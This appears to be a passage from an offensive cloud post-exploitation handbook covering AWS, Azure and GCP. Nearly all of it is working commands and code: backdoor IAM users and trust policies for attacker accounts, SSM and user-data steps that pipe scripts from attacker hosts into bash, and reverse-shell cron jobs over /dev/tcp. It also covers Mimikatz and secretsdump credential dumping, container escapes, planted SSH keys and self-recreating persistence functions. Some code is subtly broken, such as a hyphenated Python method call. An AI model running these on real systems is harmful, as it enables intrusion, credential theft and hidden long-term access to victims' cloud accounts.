#### IAM Backdoor Users

```bash
# Create backdoor admin user
aws iam create-user --user-name system-updater

# Attach admin policy
aws iam attach-user-policy \
    --user-name system-updater \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access keys
aws iam create-access-key --user-name system-updater

# Alternative: Modify existing user
aws iam create-access-key --user-name legitimate-user

# Create hidden user (unusual name)
aws iam create-user --user-name "aws:service:backup"
```

#### Backdoor IAM Roles

```bash
# Modify trust policy to allow external account
cat > trust-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::ATTACKER-ACCOUNT:root"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

aws iam update-assume-role-policy \
    --role-name TargetRole \
    --policy-document file://trust-policy.json

# Add inline policy to existing role
cat > backdoor-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

aws iam put-role-policy \
    --role-name TargetRole \
    --policy-name BackdoorAccess \
    --policy-document file://backdoor-policy.json
```

#### Systems Manager (SSM) Persistence

```bash
# Create SSM document for backdoor
cat > backdoor-document.json << 'EOF'
{
  "schemaVersion": "2.2",
  "description": "System maintenance script",
  "mainSteps": [
    {
      "action": "aws:runShellScript",
      "name": "runCommands",
      "inputs": {
        "runCommand": [
          "curl http://attacker.com/backdoor.sh | bash"
        ]
      }
    }
  ]
}
EOF

aws ssm create-document \
    --name "SystemMaintenance" \
    --document-type "Command" \
    --content file://backdoor-document.json

# Create association (automatic execution)
aws ssm create-association \
    --name "SystemMaintenance" \
    --targets "Key=tag:Environment,Values=Production" \
    --schedule-expression "cron(0 */6 * * ? *)"  # Every 6 hours
```

#### EC2 User Data Persistence

```bash
# Modify instance user data
cat > userdata.sh << 'EOF'
#!/bin/bash
curl http://attacker.com/backdoor.sh | bash &
# Original user data below...
EOF

aws ec2 modify-instance-attribute \
    --instance-id <instance-id> \
    --user-data file://userdata.sh

# User data executes on instance restart
aws ec2 reboot-instances --instance-ids <instance-id>
```

#### S3 Event Notification Backdoor

```bash
# Configure S3 event to trigger malicious Lambda
aws s3api put-bucket-notification-configuration \
    --bucket target-bucket \
    --notification-configuration '{
      "LambdaFunctionConfigurations": [
        {
          "LambdaFunctionArn": "arn:aws:lambda:region:account:function:backdoor",
          "Events": ["s3:ObjectCreated:*"]
        }
      ]
    }'
```

### Credential Dumping Tools

#### Mimikatz (Windows EC2/Azure VMs)

**Installation (on target Windows instance):**

```powershell
# Download Mimikatz
Invoke-WebRequest -Uri "http://attacker.com/mimikatz.exe" -OutFile "C:\Windows\Temp\m.exe"

# Or use PowerShell version
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
```

**Basic Usage:**

```powershell
# Standard credential dump
.\m.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Export to file
.\m.exe "privilege::debug" "sekurlsa::logonpasswords" > creds.txt

# Dump SAM
.\m.exe "privilege::debug" "lsadump::sam" "exit"

# Dump LSA secrets
.\m.exe "privilege::debug" "lsadump::secrets" "exit"

# Export tickets (Kerberos)
.\m.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# DCSync attack (if domain controller)
.\m.exe "lsadump::dcsync /user:Administrator" "exit"
```

**Cloud-Specific Credential Locations:**

```powershell
# Check for cloud credentials
Get-ChildItem Env: | Where-Object {$_.Name -like "*AWS*" -or $_.Name -like "*AZURE*"}

# AWS credentials
type C:\Users\*\.aws\credentials
type C:\Users\*\.aws\config

# Azure credentials
type C:\Users\*\.azure\credentials
type C:\Users\*\.azure\azureProfile.json

# GCP credentials
type C:\Users\*\AppData\Roaming\gcloud\credentials.db
```

#### LaZagne (Multi-Platform Password Recovery)

**Installation:**

```bash
# Download latest release
wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe  # Windows
wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/laZagne.py   # Linux

# Or clone repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne
```

**Basic Usage:**

```bash
# Linux
python3 laZagne.py all

# Specific modules
python3 laZagne.py browsers
python3 laZagne.py wifi
python3 laZagne.py databases

# Output to JSON
python3 laZagne.py all -oJ

# Verbose output
python3 laZagne.py all -v

# Windows (via wine or on target)
wine lazagne.exe all
```

**Cloud Credential Extraction:**

```bash
# AWS CLI credentials
python3 laZagne.py sysadmin -aws

# Check for stored cloud credentials
find ~/.aws ~/.azure ~/.config/gcloud -type f 2>/dev/null
```

#### secretsdump.py (Impacket)

```bash
# Dump SAM from remote Windows instance
impacket-secretsdump administrator:password@<target-ip>

# With NTLM hash
impacket-secretsdump -hashes :<ntlm-hash> administrator@<target-ip>

# Dump from local files (if extracted)
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# DCSync (requires domain admin)
impacket-secretsdump domain/administrator:password@<dc-ip> -just-dc-user krbtgt
```

### Container & Kubernetes Post-Exploitation

#### kubectl (Kubernetes Access)

```bash
# If kubeconfig stolen/found
export KUBECONFIG=/path/to/stolen/kubeconfig

# List resources
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get configmaps --all-namespaces

# Extract secrets
kubectl get secret <secret-name> -n <namespace> -o yaml
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data}'

# Decode secret
kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.password}' | base64 -d

# Execute commands in pod
kubectl exec -it <pod-name> -n <namespace> -- /bin/bash

# Port forwarding
kubectl port-forward <pod-name> -n <namespace> 8080:80

# Create backdoor pod
cat > backdoor-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
  namespace: default
spec:
  containers:
  - name: backdoor
    image: attacker/backdoor:latest
    command: ["/bin/bash", "-c", "while true; do sleep 30; done"]
  hostNetwork: true
  hostPID: true
EOF

kubectl apply -f backdoor-pod.yaml
```

#### Docker Escape Techniques

```bash
# Check if running in container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Check capabilities
capsh --print

# If CAP_SYS_ADMIN present
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/memory.limit_in_bytes

# Breakout via socket
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host bash

# If docker.sock mounted
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

**Peirates** - Kubernetes penetration testing tool.

**Installation:**

```bash
wget https://github.com/inguardians/peirates/releases/latest/download/peirates-linux-amd64.tar.xz
tar -xvf peirates-linux-amd64.tar.xz
chmod +x peirates
```

**Basic Usage:**

```bash
# Run peirates
./peirates

# Once inside:
# 1. Establish service account credentials
# 2. Enumerate pods and services
# 3. Steal secrets
# 4. Establish persistence
# 5. Pivot to other pods/nodes
```

---

**Important Related Topics:**

- **Cloud Security Monitoring Evasion**: Advanced techniques for avoiding detection in CloudWatch, GuardDuty, Security Hub
- **Serverless Exploitation**: Lambda, Azure Functions, Cloud Run specific attack vectors
- **Container Registry Poisoning**: Compromising ECR, ACR, GCR images
- **Cloud API Abuse**: Rate limiting bypass, API throttling evasion
- **Cross-Account Exploitation**: Assuming roles across AWS accounts, Azure subscription hopping
- **Cloud Ransomware Operations**: Encryption strategies for S3, EBS, Azure Blob Storage
- **Covert Channels in Cloud**: DNS tunneling, ICMP exfiltration through cloud firewalls

---

## Privilege Escalation Tools

### Pacu (AWS Exploitation Framework)

**Installation and Setup**

```bash
# Install from GitHub
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
bash install.sh
python3 pacu.py

# Alternative: pip installation
pip3 install pacu

# Initial configuration
pacu
set_keys  # Configure AWS credentials
whoami    # Verify access
```

**Privilege Escalation Modules**

**iam__privesc_scan**

```bash
# Comprehensive privilege escalation path identification
# Checks 22+ privilege escalation methods

run iam__privesc_scan

# Output analysis:
# - PassRole + Lambda/EC2/Glue creation
# - IAM policy attachment permissions
# - AssumeRole permissions
# - CreateAccessKey for other users
# - UpdateAssumeRolePolicy modifications
```

**Specific Escalation Techniques**

**Method 1: CreateAccessKey for Other Users**

```bash
# If compromised user can create access keys for privileged users
run iam__enum_users  # Identify target users

# Manual exploitation
aws iam create-access-key --user-name admin-user

# Pacu automation
run iam__backdoor_users_keys --users admin-user
```

**Method 2: PassRole + Lambda Creation**

```bash
# If user has iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction

# Create malicious Lambda with privileged role
cat > privesc_lambda.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    # Create access key for self
    response = iam.create_access_key(UserName='attacker-user')
    return {'statusCode': 200, 'body': json.dumps(response)}
EOF

zip privesc.zip privesc_lambda.py

aws lambda create-function \
  --function-name privesc-function \
  --runtime python3.11 \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --handler privesc_lambda.lambda_handler \
  --zip-file fileb://privesc.zip

aws lambda invoke --function-name privesc-function output.json
cat output.json
```

**Method 3: UpdateAssumeRolePolicy**

```bash
# If user has iam:UpdateAssumeRolePolicy on privileged role

# Modify role trust policy to allow assumption
cat > trust_policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:user/attacker-user"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

aws iam update-assume-role-policy \
  --role-name PrivilegedRole \
  --policy-document file://trust_policy.json

aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/PrivilegedRole \
  --role-session-name attacker-session
```

**Method 4: AttachUserPolicy/AttachRolePolicy**

```bash
# Pacu module
run iam__backdoor_users_policy --users target-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Manual
aws iam attach-user-policy \
  --user-name attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**Method 5: SetDefaultPolicyVersion**

```bash
# If user has iam:SetDefaultPolicyVersion and older policy version has more permissions

# List policy versions
aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/CustomPolicy

# Set older, more permissive version as default
aws iam set-default-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/CustomPolicy \
  --version-id v1
```

**Additional Pacu Privilege Escalation Modules**

```bash
# CloudFormation-based privilege escalation
run cloudformation__privesc

# EC2 instance metadata privilege escalation
run ec2__startup_shell_script  # Modify user-data to execute commands as root

# Lambda layer hijacking
run lambda__backdoor_new_roles  # Automatically backdoor newly created roles

# Systems Manager privilege escalation
run systemsmanager__rce_ec2  # Execute commands on EC2 instances via SSM
```

### AWS IAM Privilege Escalation Scripts

**enumerate-iam.sh** (Manual enumeration)

```bash
#!/bin/bash
# Comprehensive IAM privilege enumeration

echo "[*] Current Identity"
aws sts get-caller-identity

echo "[*] Attached User Policies"
USERNAME=$(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
aws iam list-attached-user-policies --user-name "$USERNAME"

echo "[*] Inline User Policies"
aws iam list-user-policies --user-name "$USERNAME"

echo "[*] Group Memberships"
aws iam list-groups-for-user --user-name "$USERNAME"

echo "[*] Checking PassRole Permission"
aws iam simulate-principal-policy \
  --policy-source-arn "arn:aws:iam::123456789012:user/$USERNAME" \
  --action-names iam:PassRole \
  --resource-arns "*"

echo "[*] Checking Privilege Escalation Vectors"
# CreateAccessKey permission
aws iam list-users --query 'Users[*].UserName' --output text | while read user; do
  aws iam simulate-principal-policy \
    --policy-source-arn "arn:aws:iam::123456789012:user/$USERNAME" \
    --action-names iam:CreateAccessKey \
    --resource-arns "arn:aws:iam::123456789012:user/$user" 2>/dev/null
done
```

### CloudFox (Multi-Path Enumeration)

**Installation**

```bash
# Install Go if not present
wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

# Install CloudFox
go install github.com/BishopFox/cloudfox@latest
```

**Privilege Escalation Analysis**

```bash
# Complete enumeration
cloudfox aws --profile compromised all-checks

# Specific privilege escalation checks
cloudfox aws --profile compromised permissions  # Permission mapping
cloudfox aws --profile compromised principals   # All principals (users/roles)
cloudfox aws --profile compromised role-trusts  # Trust relationship analysis
cloudfox aws --profile compromised pmapper      # Generate privilege escalation graph

# Analyze IAM policies for escalation paths
cloudfox aws --profile compromised iam-simulator --principal arn:aws:iam::123456789012:user/attacker

# Output stored in: ~/.cloudfox/<profile>/
# Review loot files for escalation opportunities
```

**pmapper Integration** (Principal Mapper)

```bash
# Install pmapper
pip3 install principalmapper

# Create privilege escalation graph
pmapper --profile compromised graph create

# Query escalation paths
pmapper --profile compromised query "who can do iam:CreateAccessKey on *"
pmapper --profile compromised query "who can do sts:AssumeRole on arn:aws:iam::123456789012:role/AdminRole"

# Visualize paths
pmapper --profile compromised visualize --output privesc_graph.svg
```

### Azure Privilege Escalation Tools

**ROADtools (Azure AD Reconnaissance)**

```bash
# Installation
pip3 install roadrecon

# Authenticate and gather data
roadrecon auth -u user@company.com -p password
roadrecon gather

# Analyze for privilege escalation
roadrecon gui  # Web interface at http://localhost:5000

# Command-line queries
roadrecon plugin policies  # Conditional Access policies
roadrecon plugin bloodhound  # Export to BloodHound format
```

**AzureHound (BloodHound for Azure)**

```bash
# Installation
wget https://github.com/BloodHoundAD/AzureHound/releases/latest/download/azurehound-linux-amd64.zip
unzip azurehound-linux-amd64.zip
chmod +x azurehound

# Collect data
./azurehound -u user@company.com -p password list --tenant company.onmicrosoft.com -o output.json

# Import to BloodHound
# Use BloodHound UI to analyze privilege paths
```

**Stormspotter (Azure Red Team Tool)**

```bash
# Installation
git clone https://github.com/Azure/Stormspotter.git
cd Stormspotter
pip3 install -r requirements.txt

# Data collection
python3 stormcollector/sscollector.py --cli --tenant TENANT_ID --username user@company.com

# Start frontend
cd frontend
npm install
npm start
# Access: http://localhost:3000
```

**Azure Privilege Escalation Techniques**

**Method 1: Application Administrator Role**

```bash
# If user has Application Administrator role
# Can reset credentials of service principals with higher privileges

# List service principals
az ad sp list --query "[].{Name:displayName, AppId:appId, Id:id}"

# Add credentials to high-privilege service principal
az ad sp credential reset --id APP_ID

# Use new credentials
az login --service-principal \
  --username APP_ID \
  --password NEW_SECRET \
  --tenant TENANT_ID
```

**Method 2: Contributor Role on Automation Accounts**

```bash
# If Contributor on Automation Account
# Create runbook with managed identity to execute privileged operations

az automation runbook create \
  --resource-group RG \
  --automation-account-name AutoAcct \
  --name privesc-runbook \
  --type PowerShell

# Create runbook content
cat > privesc_runbook.ps1 << 'EOF'
$connection = Get-AutomationConnection -Name AzureRunAsConnection
Connect-AzAccount -ServicePrincipal -Tenant $connection.TenantId -ApplicationId $connection.ApplicationId -CertificateThumbprint $connection.CertificateThumbprint

# Escalate: Add self to privileged group
Add-AzureADGroupMember -ObjectId "ADMIN_GROUP_ID" -RefObjectId "ATTACKER_USER_ID"
EOF

az automation runbook import \
  --resource-group RG \
  --automation-account-name AutoAcct \
  --name privesc-runbook \
  --type PowerShell \
  --source-file privesc_runbook.ps1

az automation runbook publish \
  --resource-group RG \
  --automation-account-name AutoAcct \
  --name privesc-runbook

az automation runbook start \
  --resource-group RG \
  --automation-account-name AutoAcct \
  --name privesc-runbook
```

**Method 3: Reset Password of Service Principal Owner**

```bash
# If user can manage applications they own
# Create app, add service principal to privileged group

az ad app create --display-name innocuous-app

az ad sp create --id APP_ID

# Add service principal to privileged group (if permissions allow)
az ad group member add \
  --group PRIVILEGED_GROUP \
  --member-id SERVICE_PRINCIPAL_OBJECT_ID
```

### GCP Privilege Escalation Tools

**GCP-IAM-Privilege-Escalation** (Enumeration Script)

```bash
# Download
wget https://raw.githubusercontent.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/master/PrivEscScanner.py

# Run enumeration
python3 PrivEscScanner.py \
  --project-id PROJECT_ID \
  --service-account-key-file credentials.json

# Identifies 27+ privilege escalation methods in GCP
```

**GCP Privilege Escalation Methods**

**Method 1: Service Account Key Creation**

```bash
# If user has iam.serviceAccountKeys.create permission

# Create key for privileged service account
gcloud iam service-accounts keys create privesc-key.json \
  --iam-account=privileged-sa@project.iam.gserviceaccount.com

# Authenticate with new key
gcloud auth activate-service-account --key-file=privesc-key.json

# Verify elevated access
gcloud projects get-iam-policy PROJECT_ID
```

**Method 2: Set IAM Policy**

```bash
# If user has setIamPolicy permission at any level

# Get current policy
gcloud projects get-iam-policy PROJECT_ID --format=json > policy.json

# Modify to add self as Owner
cat policy.json | jq '.bindings += [{"role":"roles/owner","members":["user:attacker@gmail.com"]}]' > new_policy.json

# Apply modified policy
gcloud projects set-iam-policy PROJECT_ID new_policy.json
```

**Method 3: Cloud Functions Deployment**

```bash
# If user has cloudfunctions.functions.create + iam.serviceAccounts.actAs

# Create privilege escalation function
cat > main.py << 'EOF'
import google.auth
from google.cloud import iam_v1

def privesc(request):
    credentials, project = google.auth.default()
    client = iam_v1.IAMClient(credentials=credentials)
    
    # Grant self project owner role
    policy = client.get_iam_policy(request={'resource': f'projects/{project}'})
    policy.bindings.add(
        role='roles/owner',
        members=['user:attacker@gmail.com']
    )
    client.set_iam_policy(request={'resource': f'projects/{project}', 'policy': policy})
    return 'Escalated'
EOF

# Deploy with privileged service account
gcloud functions deploy privesc-func \
  --runtime python39 \
  --trigger-http \
  --entry-point privesc \
  --service-account privileged-sa@project.iam.gserviceaccount.com \
  --allow-unauthenticated

# Trigger function
curl https://REGION-PROJECT_ID.cloudfunctions.net/privesc-func
```

### WeirdAAL (AWS Enumeration and Exploitation)

```bash
# Installation
git clone https://github.com/carnal0wnage/weirdAAL.git
cd weirdAAL
pip3 install -r requirements.txt

# Setup credentials
python3 weirdAAL.py -l  # List modules

# Privilege escalation reconnaissance
python3 weirdAAL.py -m recon_all -t profile_name

# Specific escalation checks
python3 weirdAAL.py -m privesc_iam_user_policy -t profile_name
python3 weirdAAL.py -m privesc_iam_assume_role -t profile_name
```

### ScoutSuite (Multi-Cloud Security Auditing)

```bash
# Installation
pip install scoutsuite

# AWS comprehensive scan
scout aws --profile compromised --report-dir ./scout_reports

# Focus on IAM for privilege escalation vectors
scout aws --profile compromised --services iam

# Azure scan
scout azure --cli

# GCP scan
scout gcp --service-account credentials.json --project-id PROJECT_ID

# Review HTML report: scout_reports/scoutsuite-report/index.html
# Look for:
# - Overly permissive IAM policies
# - Privilege escalation paths
# - Weak authentication configurations
```

## Persistence Mechanisms

### AWS Persistence Techniques

**IAM User Backdoors**

**Create Additional Access Keys**

```bash
# Create second access key for compromised user
aws iam create-access-key --user-name compromised-user

# Pacu automation
run iam__backdoor_users_keys --users compromised-user
```

**Create Shadow Admin User**

```bash
# Create new IAM user with administrative access
aws iam create-user --user-name system-backup-agent
aws iam create-access-key --user-name system-backup-agent
aws iam attach-user-policy \
  --user-name system-backup-agent \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Stealth: Use name that blends with legitimate automation accounts
# Add to service-related groups to avoid detection
```

**Backdoor Existing Roles**

```bash
# Modify trust policy to allow external account assumption
cat > backdoor_trust.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

aws iam update-assume-role-policy \
  --role-name ProductionAdminRole \
  --policy-document file://backdoor_trust.json

# From attacker account
aws sts assume-role \
  --role-arn arn:aws:iam::VICTIM_ACCOUNT:role/ProductionAdminRole \
  --role-session-name backup-service
```

**Lambda Backdoors**

**Event-Driven Persistence**

```bash
# Create Lambda triggered by specific events
cat > persistence_lambda.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    # Triggered on specific CloudTrail event
    # Maintain access by creating new credentials periodically
    iam = boto3.client('iam')
    
    try:
        iam.create-access-key(UserName='system-backup-agent')
    except:
        pass
    
    return {'statusCode': 200}
EOF

zip persistence.zip persistence_lambda.py

aws lambda create-function \
  --function-name system-health-monitor \
  --runtime python3.11 \
  --role arn:aws:iam::123456789012:role/LambdaExecRole \
  --handler persistence_lambda.lambda_handler \
  --zip-file fileb://persistence.zip

# Create EventBridge rule to trigger Lambda
aws events put-rule \
  --name daily-health-check \
  --schedule-expression "rate(1 day)"

aws events put-targets \
  --rule daily-health-check \
  --targets "Id"="1","Arn"="arn:aws:lambda:us-east-1:123456789012:function:system-health-monitor"

aws lambda add-permission \
  --function-name system-health-monitor \
  --statement-id daily-trigger \
  --action lambda:InvokeFunction \
  --principal events.amazonaws.com \
  --source-arn arn:aws:events:us-east-1:123456789012:rule/daily-health-check
```

**Layer-Based Persistence**

```bash
# Create Lambda layer with backdoor code
# Affects all functions using the layer

mkdir python
cat > python/persistence.py << 'EOF'
import boto3
import os

# Automatically execute on any Lambda using this layer
iam = boto3.client('iam')
try:
    iam.create-access-key(UserName='system-backup-agent')
except:
    pass
EOF

zip -r layer.zip python/

aws lambda publish-layer-version \
  --layer-name common-utilities \
  --zip-file fileb://layer.zip \
  --compatible-runtimes python3.11

# Modify existing functions to use backdoored layer
aws lambda update-function-configuration \
  --function-name target-function \
  --layers arn:aws:lambda:us-east-1:123456789012:layer:common-utilities:1
```

**EC2 Persistence**

**User Data Backdoor**

```bash
# Modify EC2 user data to execute on reboot
aws ec2 modify-instance-attribute \
  --instance-id i-1234567890abcdef0 \
  --user-data file://backdoor_userdata.sh

# backdoor_userdata.sh content
cat > backdoor_userdata.sh << 'EOF'
#!/bin/bash
# Add SSH key to authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD... attacker@kali" >> /home/ec2-user/.ssh/authorized_keys

# Create reverse shell cron job
(crontab -l 2>/dev/null; echo "*/15 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'") | crontab -
EOF

# Base64 encode for API
base64 -w 0 backdoor_userdata.sh
```

**Instance Profile Credential Harvesting**

```bash
# Create Lambda to harvest EC2 instance profile credentials
cat > harvest_lambda.py << 'EOF'
import boto3
import requests

def lambda_handler(event, context):
    # Get all running instances
    ec2 = boto3.client('ec2')
    instances = ec2.describe_instances(
        Filters=[{'Name': 'instance-state-name', 'Values': ['running']}]
    )
    
    # For each instance, attempt to access metadata service (requires SSM or similar)
    # Store credentials externally
    pass
EOF
```

**S3 Bucket Policies**

**Backdoor Bucket Access**

```bash
# Add policy allowing external account access
cat > backdoor_bucket_policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "BackupServiceAccess",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"
      },
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::target-bucket",
        "arn:aws:s3:::target-bucket/*"
      ]
    }
  ]
}
EOF

aws s3api put-bucket-policy \
  --bucket target-bucket \
  --policy file://backdoor_bucket_policy.json
```

**SNS Topic Subscription**

```bash
# Subscribe to SNS topics to receive notifications
# Useful for monitoring security alerts

aws sns subscribe \
  --topic-arn arn:aws:sns:us-east-1:123456789012:security-alerts \
  --protocol email \
  --notification-endpoint attacker@protonmail.com
```

**Secrets Manager Backdoors**

```bash
# Replace legitimate secrets with backdoored versions
# Steal original secret
aws secretsmanager get-secret-value --secret-id prod/database/password

# Create backdoored version with embedded exfiltration
cat > backdoor_secret.json << 'EOF'
{
  "username": "admin",
  "password": "original_password",
  "backup_endpoint": "https://attacker-c2.com/exfil"
}
EOF

aws secretsmanager update-secret \
  --secret-id prod/database/password \
  --secret-string file://backdoor_secret.json
```

**Systems Manager (SSM) Persistence**

**Create SSM Document**

```bash
# Custom SSM document for command execution
cat > persistence_document.json << 'EOF'
{
  "schemaVersion": "2.2",
  "description": "System maintenance tasks",
  "mainSteps": [
    {
      "action": "aws:runShellScript",
      "name": "executeScript",
      "inputs": {
        "runCommand": [
          "#!/bin/bash",
          "curl http://ATTACKER_IP/beacon.sh | bash"
        ]
      }
    }
  ]
}
EOF

aws ssm create-document \
  --name System-Maintenance \
  --document-type Command \
  --content file://persistence_document.json

# Create association to run periodically
aws ssm create-association \
  --name System-Maintenance \
  --targets "Key=tag:Environment,Values=production" \
  --schedule-expression "rate(30 minutes)"
```

### Azure Persistence Techniques

**Service Principal Backdoors**

**Create Shadow Service Principal**

```bash
# Create application registration
az ad app create --display-name "Azure Backup Service"

# Create service principal
az ad sp create --id APP_ID

# Assign privileged role
az role assignment create \
  --assignee SERVICE_PRINCIPAL_ID \
  --role Contributor \
  --scope /subscriptions/SUBSCRIPTION_ID

# Create credential
az ad sp credential reset --id APP_ID
```

**Application Registration Certificate**

```bash
# Add certificate credential to existing high-privilege application
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=BackupCert"

az ad app credential reset \
  --id APP_ID \
  --cert @cert.pem \
  --append  # Keep existing credentials

# Use certificate for authentication
az login --service-principal \
  --username APP_ID \
  --tenant TENANT_ID \
  --certificate cert.pem \
  --key key.pem
```

**Azure Function Persistence**

**Timer-Triggered Persistence**

```bash
# Create function app
az functionapp create \
  --resource-group RG \
  --consumption-plan-location eastus \
  --runtime python \
  --name maintenance-tasks \
  --storage-account storageaccount

# Create timer-triggered function
cat > __init__.py << 'EOF'
import azure.functions as func
from azure.identity import DefaultAzureCredential
from azure.mgmt.authorization import AuthorizationManagementClient

def main(mytimer: func.TimerRequest) -> None:
    # Maintain role assignments
    credential = DefaultAzureCredential()
    client = AuthorizationManagementClient(credential, "SUBSCRIPTION_ID")
    # Add logic to maintain persistence
    pass
EOF

cat > function.json << 'EOF'
{
  "bindings": [
    {
      "name": "mytimer",
      "type": "timerTrigger",
      "direction": "in",
      "schedule": "0 0 */6 * * *"
    }
  ]
}
EOF

# Deploy function
func azure functionapp publish maintenance-tasks
```

**Automation Account Runbooks**

```bash
# Create persistent runbook
az automation runbook create \
  --resource-group RG \
  --automation-account-name AutoAcct \
  --name persistent-maintenance \
  --type PowerShell

cat > persistence_runbook.ps1 << 'EOF'
$connection = Get-AutomationConnection -Name AzureRunAsConnection
Connect-AzAccount -ServicePrincipal -Tenant $connection.TenantId -ApplicationId $connection.ApplicationId -CertificateThumbprint $connection.CertificateThumbprint

# Maintain backdoor service principal
$sp = Get-AzADServicePrincipal -DisplayName "Azure Backup Service"
if (-not $sp) {
    # Recreate if deleted
    New-AzADServicePrincipal -DisplayName "Azure Backup Service"
}
EOF

az automation runbook import \
  --resource-group RG \
  --automation-account-name AutoAcct \
  --name persistent-maintenance \
  --type PowerShell \
  --source-file persistence_runbook.ps1

# Schedule execution
az automation schedule create \
  --resource-group RG \
  --automation-account-name AutoAcct \
  --name daily-maintenance \
  --frequency Day \
  --interval 1
```

**Azure AD Dynamic Group Rules**

```bash
# [Inference] Modify dynamic group membership rules to automatically add attacker accounts

az ad group create \
  --display-name "Privileged Access Management" \
  --mail-nickname PAM \
  --type Security

# Add members programmatically through MS Graph API
# Requires Microsoft.Graph PowerShell module
```

**Virtual Machine Extensions**

```bash
# Add Custom Script Extension for persistence
cat > persistence_script.sh << 'EOF'
#!/bin/bash
# Add SSH key
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD... attacker@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Reverse shell cron job
(crontab -l 2>/dev/null; echo "*/20 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'") | crontab -
EOF

az vm extension set \
  --resource-group RG \
  --vm-name target-vm \
  --name customScript \
  --publisher Microsoft.Azure.Extensions \
  --settings '{"fileUris": ["https://attacker-storage.blob.core.windows.net/scripts/persistence_script.sh"],"commandToExecute": "bash persistence_script.sh"}'
```

### GCP Persistence Techniques

**Service Account Key Persistence**

```bash
# Create additional keys for service accounts
gcloud iam service-accounts keys create persistence-key.json \
  --iam-account=compute-default@project.iam.gserviceaccount.com

# Store key externally and use for future access
gcloud auth activate-service-account --key-file=persistence-key.json
```

**Cloud Function Persistence**

```bash
# Create scheduled Cloud Function
cat > main.py << 'EOF'
import googleapiclient.discovery
from google.oauth2 import service_account

def maintain_persistence(event, context):
    # Ensure backdoor service account exists
    service = googleapiclient.discovery.build('iam', 'v1')
    project_id = 'PROJECT_ID'
    
    # Check if backdoor account exists, recreate if necessary
    accounts = service.projects().serviceAccounts().list(
        name=f'projects/{project_id}'
    ).execute()
    
    backdoor_exists = False
    for account in accounts.get('accounts', []):
        if 'backup-service' in account['email']:
            backdoor_exists = True
    
    if not backdoor_exists:
        # Recreate backdoor account
        service.projects().serviceAccounts().create(
            name=f'projects/{project_id}',
            body={
                'accountId': 'backup-service',
                'serviceAccount': {
                    'displayName': 'Backup Service Account'
                }
            }
        ).execute()
EOF

gcloud functions deploy maintain-persistence \
  --runtime python39 \
  --trigger-topic persistence-trigger \
  --entry-point maintain_persistence

# Create Cloud Scheduler job
gcloud scheduler jobs create pubsub persistence-job \
  --schedule="0 */6 * * *" \
  --topic=persistence-trigger \
  --message-body="maintain"
```

**Compute Engine Startup Scripts**

```bash
# Add startup script to VM for persistence
gcloud compute instances add-metadata INSTANCE_NAME \
  --metadata-from-file startup-script=persistence_startup.sh

# persistence_startup.sh
cat > persistence_startup.sh << 'EOF'
#!/bin/bash
# Add SSH key
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD... attacker@kali" >> /home/user/.ssh/authorized_keys

# Install backdoor
curl http://ATTACKER_IP/backdoor.sh | bash
EOF
```

**IAM Policy Binding Persistence**

```bash
# Add attacker account to high-privilege role at organization level
